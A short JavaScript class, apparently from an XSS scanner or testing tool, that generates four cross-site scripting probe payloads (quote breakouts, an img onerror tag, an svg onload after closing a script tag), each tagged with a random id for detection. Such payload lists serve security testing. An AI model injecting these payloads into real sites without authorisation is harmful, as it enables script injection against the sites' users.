class Payloads {
  get () {
    var payloads = []
    var list = [
      "';alert({identifier})//",
      "\";alert({identifier})//",
      "\"><img src=x onerror=alert({identifier})>",
      "</script><svg/onload=alert({identifier})>"
    ]

    list.forEach((payload) => {
      let id = this.id()
      payloads.push({
        id: id,
        payload: payload.replace('{identifier}', id)
      })
    })

    return payloads
  }

  id () {
    let number = Math.random()
    let id = number.toString().substr(0, 6)

    return id
  }
}
